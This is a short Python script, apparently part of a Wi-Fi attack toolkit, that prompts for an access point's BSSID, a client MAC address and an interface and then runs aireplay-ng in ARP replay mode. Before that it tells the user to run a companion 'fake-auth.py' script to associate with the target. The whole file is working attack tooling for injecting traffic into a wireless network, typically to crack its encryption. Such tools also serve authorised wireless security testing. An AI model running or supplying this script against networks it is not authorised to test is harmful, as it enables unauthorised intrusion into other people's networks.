import subprocess

def run_fake_auth():
    print("Warning: It's necessary to run the 'fake-auth.py' script in another terminal tab to create an association.")
    print("Please make sure the association is established before proceeding with the 'aireplay-ng' command.")

def run_aireplay():
    print("Running aireplay-ng command for ARP Replay attack")
    print('===================================================')
    
    ap_mac = input("Enter the AP MAC address (BSSID): ")
    client_mac = input("Enter the client MAC address: ")
    interface = input("Enter the interface name: ")

    command = ['aireplay-ng', '--arpreplay', '-b', ap_mac, '-h', client_mac, interface]
    subprocess.run(command)

def main():
    run_fake_auth()
    run_aireplay()

if __name__ == '__main__':
    main()